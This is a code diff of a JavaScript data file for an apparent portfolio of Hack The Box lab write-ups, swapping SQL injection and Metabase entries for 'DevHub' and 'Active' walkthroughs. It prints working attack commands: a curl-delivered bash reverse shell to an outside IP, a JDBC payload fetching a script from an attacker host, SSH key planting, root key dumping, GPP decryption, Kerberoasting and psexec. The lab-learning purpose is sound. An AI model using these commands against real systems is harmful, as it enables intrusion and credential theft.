@@ -244,33 +244,45 @@
   <script>
   const WRITEUP_DATA = {
 
-    appointment: {
-      title: "HTB: Appointment", badge: "Linux // Very Easy",
-      os: "Linux", diff: "Easy", diffColor: "var(--neon-green)",
-      port: "80/tcp", time: "~35 min", vector: "SQLi → Auth Bypass",
+   devhub: {
+      title: "HTB: Undisclosed YET", 
+      badge: "Linux // Medium",
+      os: "Linux", diff: "Medium", diffColor: "var(--neon-cyan)",
+      port: "22, 80, 6274", time: "1h 36m", 
+      vector: "MCPJam RCE → Jupyter Pivoting → Debug API Exploitation",
       hasFullWriteup: true,
       nodes: [
-        {
-          phase: "RECONNAISSANCE", title: "Nmap Target Port Verification",
-          body: "Single open port. Apache 2.4.38 serving a login form — no other visible attack surface.",
-          code: `<span style="color:var(--neon-purple)"># nmap 10.129.17.133</span>\nPORT   STATE SERVICE\n<span style="color:var(--neon-green)">80/tcp  open  http</span>`
+        { 
+          phase: "RECONNAISSANCE", 
+          title: "Service Fingerprinting & Host Mapping", 
+          body: "Initial scan identified an exposed SSH port, a web server redirecting to devhub.htb, and an unknown service on port 6274. Fingerprinting revealed it as MCPJam Inspector v1.4.2. I mapped the host in my local /etc/hosts to resolve the domain-based redirects.", 
+          code: "sudo nmap -sC -sV -p- 10.129.12.158 -oN DevHub.txt\necho \"10.129.12.158 devhub.htb\" | sudo tee -a /etc/hosts" 
+        },
+        { 
+          phase: "INITIAL ACCESS", 
+          title: "Weaponizing MCPJam Inspector RCE", 
+          body: "The service on port 6274 was vulnerable to a known RCE. Attempting direct command execution failed due to lack of output handling, so I bypassed this by crafting a JSON-based reverse shell payload sent directly to the /api/mcp/connect endpoint. The listener successfully caught the shell as user 'mcp-dev'.", 
+          code: "curl http://10.129.12.158:6274/api/mcp/connect \\\n  --header \"Content-Type: application/json\" \\\n  --data '{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/10.10.17.209/4444 0>&1\" &],\"env\":{}},\"serverId\":\"mytest\"}'" 
+        },
+        { 
+          phase: "LATERAL MOVEMENT", 
+          title: "Pivoting via SSH Tunneling", 
+          body: "After failing to escalate privileges locally, I audited the process list and found a Jupyter Notebook instance running on the localhost port 8888. Because I faced XSRF validation errors when hitting the API directly, I set up an SSH port forward. This allowed me to map the remote 8888 port to my local browser, granting me access to the 'analyst' account's workspace.", 
+          code: "echo 'ssh-rsa AAAAB3...[key]...' > /home/mcp-dev/.ssh/authorized_keys\nssh -L 8888:localhost:8888 mcp-dev@10.129.12.158\n# Accessing: http://localhost:8888/lab" 
+        },
+        { 
+          phase: "PRIVILEGE ESCALATION", 
+          title: "Debug Endpoint & Secret Extraction", 
+          body: "As 'analyst', I discovered an OPSMCP server running as root on port 5000. By auditing the server.py source code, I identified hardcoded API keys and hidden, undocumented endpoints prefixed with '_'. By calling 'ops._debug_mode', I toggled access to 'ops._admin_dump', which allowed me to query and extract the root SSH private keys.", 
+          code: "grep -n \"debug\\|admin\\|secret\" /opt/opsmcp/server.py\n# Toggle Debug Mode:\ncurl -X POST http://127.0.0.1:5000/tools/call -H \"X-API-Key: XXXX\" -d '{\"name\":\"ops._debug_mode\"}'\n# Dump SSH Keys:\ncurl -X POST http://127.0.0.1:5000/tools/call -H \"X-API-Key: XXXX\" -d '{\"name\":\"ops._admin_dump\",\"arguments\":{\"confirm\":true,\"target\":\"ssh_keys\"}}'" 
         },
         {
-          phase: "ENUMERATION", title: "Gobuster Path Discovery",
-          body: "No hidden admin panels found. Attack surface is limited entirely to the login form.",
-          code: `<span style="color:var(--neon-purple)"># gobuster dir -u http://10.129.17.133 -w /usr/share/wordlists/common.txt</span>\n/images  (Status: 301)\n/css     (Status: 301)`
-        },
-        {
-          phase: "EXPLOITATION", title: "Comment-Based Authentication Bypass",
-          body: "The login query is built via raw string concatenation. A hash comment terminates the WHERE clause, bypassing password verification entirely.",
-          code: `<span style="color:var(--neon-cyan)">Username:</span> admin'#\n<span style="color:var(--neon-cyan)">Password:</span> [ANY_DUMMY_VALUE]\n\n<span style="color:var(--text-dark)">-- Resulting SQL:</span>\n<span style="color:#f59e0b">SELECT * FROM users WHERE user='admin'</span><span style="color:var(--neon-purple)">#' AND pass='...'</span>\n\n<span style="color:var(--neon-green)">[✓] Verification bypassed. Trailing logic commented out.</span>`
+          phase: "LESSONS LEARNED",
+          title: "Key Takeaways",
+          body: "1) **Pivot Smarter, Not Harder:** When APIs are protected by XSRF or complex CORS policies, an SSH tunnel is the most reliable way to bring the attack surface into a user-friendly browser environment.  2) **Code Auditing is King:** The difference between a rabbit hole and a direct path to root often lies in grepping the source code for unconventional patterns—like hidden debug endpoints—rather than guessing common exploit paths. 3) **Credential Reuse:** Always check environment variables and hidden configuration files like '.opsmcp_key' immediately after gaining a foothold."
         }
       ],
-      tasks: [
-        { q: "1. What does the acronym SQL stand for?", a: "Structured Query Language" },
-        { q: "2. What character comments out the rest of a MySQL line?", a: "#" }
-      ],
-      flag: "HTB{sql_1nj_4uth_byp4ss_cleared}"
+      flag: "User: XXXX | Root: XXXX"
     },
 
     reactor: {
@@ -297,27 +309,49 @@
       ]
     },
 
-    analytics: {
-      title: "Analytics Engine Leak", badge: "Linux // Medium",
-      os: "Linux", diff: "Medium", diffColor: "var(--neon-cyan)",
-      port: "8080/tcp", time: "~1h", vector: "Pre-Auth Env Leak → RCE",
-      hasFullWriteup: false,
+    active: {
+      title: "HTB: Active", 
+      badge: "Windows // Easy",
+      os: "Windows", diff: "Easy", diffColor: "var(--neon-green)",
+      port: "53, 88, 135, 139, 445, 389, ...", time: "1h 10m", 
+      vector: "GPP Credential Theft → Kerberoasting → SMB Service Execution",
+      hasFullWriteup: true,
       nodes: [
-        {
-          phase: "DISCOVERY", title: "Unauthenticated Config Endpoint",
-          body: "Metabase instance exposes /api/session/properties pre-auth, leaking the setup-token used to bootstrap an admin account.",
-          code: `<span style="color:var(--neon-purple)"># curl http://target:8080/api/session/properties | jq</span>\n<span style="color:var(--neon-cyan)">"setup-token"</span>: <span style="color:var(--neon-green)">"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"</span>`
+        { 
+          phase: "RECONNAISSANCE", 
+          title: "Domain Enumeration", 
+          body: "Initial Nmap scanning identified a Windows Server 2008 R2 Domain Controller. The open SMB and LDAP ports confirmed a classic Active Directory environment. I used 'smbmap' to identify readable shares, finding that 'Replication' was accessible without authentication.", 
+          code: "nmap -sC -sV -p- 10.10.10.100\nsmbmap -H 10.10.10.100" 
+        },
+        { 
+          phase: "INITIAL ACCESS", 
+          title: "GPP Password Recovery", 
+          body: "Within the 'Replication' share, I located a 'Groups.xml' file containing a Group Policy Preference (GPP) password. Because the AES key for these passwords was publicly documented by Microsoft, I decrypted the 'cpassword' to obtain the domain credentials for 'SVC_TGS'.", 
+          code: "smbclient //10.10.10.100/Replication\n# Decrypting the hash:\ngpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
+        },
+        { 
+          phase: "LATERAL MOVEMENT", 
+          title: "Kerberoasting", 
+          body: "Using the 'SVC_TGS' credentials, I performed a Kerberoasting attack. By requesting Service Principal Name (SPN) tickets, I identified that the 'Administrator' account had an extractable service ticket. I saved this ticket to crack it offline.", 
+          code: "GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out\n# Crack the ticket:\nhashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt" 
+        },
+        { 
+          phase: "PRIVILEGE ESCALATION", 
+          title: "SMB Service Execution", 
+          body: "With the Administrator password recovered, I gained full read/write access to the 'C$' and 'ADMIN$' shares. Instead of just grabbing files, I used Impacket's 'psexec.py' to upload a service and execute it, granting me an NT AUTHORITY\SYSTEM shell.", 
+          code: "psexec.py active.htb/administrator@10.10.10.100\nwhoami # nt authority\\system" 
         },
         {
-          phase: "EXPLOITATION", title: "CVE-2023-38646 — Pre-Auth RCE",
-          body: "Setup token used to hit /api/setup/validate with a crafted H2 JDBC URL, triggering server-side command execution via init scripts.",
-          code: `POST /api/setup/validate\n{\n  "token": <span style="color:var(--neon-purple)">"&lt;setup-token&gt;"</span>,\n  "details": { "db": "<span style="color:var(--neon-cyan)">jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://attacker/shell.sql'</span>" }\n}`
+          phase: "LESSONS LEARNED",
+          title: "Key Takeaways",
+          body: "1) **GPP are Dangerous:** Storing passwords in Group Policy Preferences is a critical security failure, even if encrypted. 2) **Kerberoasting:** If you have any valid domain user, always hunt for SPNs; they are the path of least resistance to Domain Admin.  3) **SMB is Powerful:** In Windows environments, readable shares (like SYSVOL or Replication) often contain the 'keys to the kingdom' that enable escalation without needing complex RCE exploits."
         }
-      ]
+      ],
+      flag: "User: 86d67d8b... | Root: b5fc76d1..."
     },
 
-    cryptoforge: {
-      title: "CryptoForge Matrix", badge: "Challenge // Hard",
+    DummyData1: {
+      title: "DummyData", badge: "Challenge // Hard",
       os: "N/A", diff: "Hard", diffColor: "#f59e0b",
       port: "—", time: "~2h", vector: "CBC IV Reuse → Bit-flip Forgery",
       hasFullWriteup: false,
@@ -335,8 +369,8 @@
       ]
     },
 
-    syncnode: {
-      title: "ActiveDirectory SyncNode", badge: "Windows // Insane",
+    DummyData2: {
+      title: "DummyData", badge: "Windows // Insane",
       os: "Windows", diff: "Insane", diffColor: "#ef4444",
       port: "445, 88, 389", time: "~4h", vector: "ADCS ESC8 → Domain Admin",
       hasFullWriteup: false,
